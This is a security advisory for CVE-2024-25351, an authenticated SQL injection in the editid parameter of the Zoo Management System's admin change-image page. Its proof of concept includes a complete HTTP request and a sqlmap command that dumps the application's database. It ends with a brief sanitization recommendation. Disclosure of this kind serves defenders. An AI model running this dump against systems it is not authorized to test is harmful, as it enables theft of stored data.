# Zoo Management System - Authenticated SQL Injection (Admin Change Image Mechanism)

### CVE Assigned:
**[CVE-2024-25351](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-25351)** [mitre.org](https://www.cve.org/CVERecord?id=CVE-2024-25351) [nvd.nist.org](https://nvd.nist.gov/vuln/detail/CVE-2024-25351)

### Date:

> 25 Jan 2024

### Author Email:

> yevhenii.butenko@outlook.com

### Vendor Homepage:

> https://phpgurukul.com

### Software Link:

> [Zoo Management System](https://phpgurukul.com/zoo-management-system-using-php-and-mysql/)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> /zms/admin/changeimage.php

> `editid` parameter within admin change image mechanism is vulnerable to SQL Injection.


![editid](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/zoo_mng_changeimage_sqli.png?raw=true)


### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### SQLMap

Save the following request to `change_image.txt`:

```
POST /zms/admin/changeimage.php?editid=8 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------418976152913215186701444849658
Content-Length: 452
Origin: http://localhost
Connection: close
Referer: http://localhost/zms/admin/changeimage.php?editid=8
Cookie: PHPSESSID=oe2gqujhc60h10p659a1gj2a7u
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------418976152913215186701444849658
Content-Disposition: form-data; name="aname"

Bear
-----------------------------418976152913215186701444849658
Content-Disposition: form-data; name="image"; filename="bird.jpg"
Content-Type: image/jpeg

data
-----------------------------418976152913215186701444849658
Content-Disposition: form-data; name="submit"


-----------------------------418976152913215186701444849658--
```

Use `sqlmap` with `-r` option to exploit the vulnerability:

```
sqlmap -r change_image.txt --level 5 --risk 3 --dbms MYSQL -p editid --dump -D zmsdb
```


## Recommendations

When using this Zoo Management System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
